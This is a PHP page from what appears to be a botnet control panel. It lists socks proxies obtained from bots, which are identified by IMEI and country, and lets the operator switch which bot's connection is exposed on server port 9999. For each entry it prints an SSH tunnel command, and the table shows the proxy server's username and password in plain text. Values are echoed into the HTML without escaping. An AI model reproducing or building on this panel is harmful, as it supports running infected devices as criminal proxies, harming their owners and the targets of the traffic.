<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';

include_once 'includes/header.php';
require_once 'includes/func.php';
?>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if ($_POST['checkSocks']) {
        checkSocksConnections($db);
    }
    if ($_POST['createBridge']) {
        $id = filter_input(INPUT_POST, 'socks_id');
        createBridge($db, $id);
        if (createBridge($db, $id)) {
            $_SESSION['success'] = "Proxy bridge has been changed successfully!";
        } else {
            $_SESSION['failure'] = "Something went wrong...";
        }
        exit();
    }
}
?>



<?php
$select = array('id', 'ip', 'country', 'forward_user', 'forward_pass', 'time', 'note', 'status');
$p_servers = $db->get('proxy_servers');
?>

<div id="page-wrapper">
    <div class="row">

        <div class="col-lg-6">
            <h1 class="page-header">Socks connections</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right">
                <button class="btn btn-success" onclick="createBridge()" style="margin-right: 8px;"><span class="glyphicon glyphicon-ok"></span> Switch proxy </button>
                <button class="btn btn-success" onclick="checkSocksConnections()" style="margin-right: 8px;"><span class="glyphicon glyphicon-refresh"></span> Check connections </button>
            </div>
        </div>
    </div>
    <?php include('./includes/flash_messages.php') ?>
    <!-- proxy servers -->

    <?php
    // select the columns
    $select = array('id', 'imei', 'bot_country', 'server', 'port', 'connect_time', 'status');
    $socks = $db->get('socks');
    ?>
    <h5>Socks proxies for your connections will be available after send socks command to bot. You can make a choice and click the button for enable selected connection on server port 9999.</h5>
    <br>

    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th>#</th>
            <th>id</th>
            <th>IMEI</th>
            <th>Bot country</th>
            <th>Server id</th>
            <th>Server ip</th>
            <th>Server user</th>
            <th>Server pass</th>
            <th>Port</th>
            <th>Connection time</th>
            <th>Manual connection cmd</th>
            <th>Status</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($socks as $row) {
            $p_server = null;
            foreach ($p_servers as $server){
                if ($server['id'] == $row['server']){
                    $p_server = $server;
                }
            }

            ?>
            <tr>
                <td>
                    <div class="radio">
                        <label><input type="radio" name="serverid" value="<?php echo $row['id'] ?>"></label>
                    </div>
                </td>
                <td><?php echo $row['id'] ?></td>
                <td><?php echo $row['imei'] ?></td>
                <td><?php echo $row['bot_country'] ?> </td>
                <td><?php echo $row['server'] ?></td>
                <td><?php echo $p_server['ip'] ?></td>
                <td><?php echo $p_server['forward_user'] ?></td>
                <td><?php echo $p_server['forward_pass'] ?></td>
                <td><?php echo $row['port'] ?></td>
                <td><?php echo date("Y-m-d H:i",$row['connect_time']) ?></td>
                <td>ssh -N -L <?php echo $row['port'] ?>:127.0.0.1:<?php echo $row['port'] ?> <?php echo $p_server['forward_user'] ?>@<?php echo $p_server['ip'] ?></td>
                <td><i class="glyphicon glyphicon-sort" aria-hidden="true" <?php if ($row['status']) {echo 'style="color:#5bb85c;"';} else {echo 'style="color:#d43f3a;"';}?>></i></td>
                <td>
                    <!--<a href="" class="btn btn-primary" style="margin-right: 8px;"><span class="glyphicon glyphicon-edit"></span>-->
                    <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_proxy.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id="del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to delete this connection?</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        <?php } ?>
        </tbody>
    </table>
</div>

<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

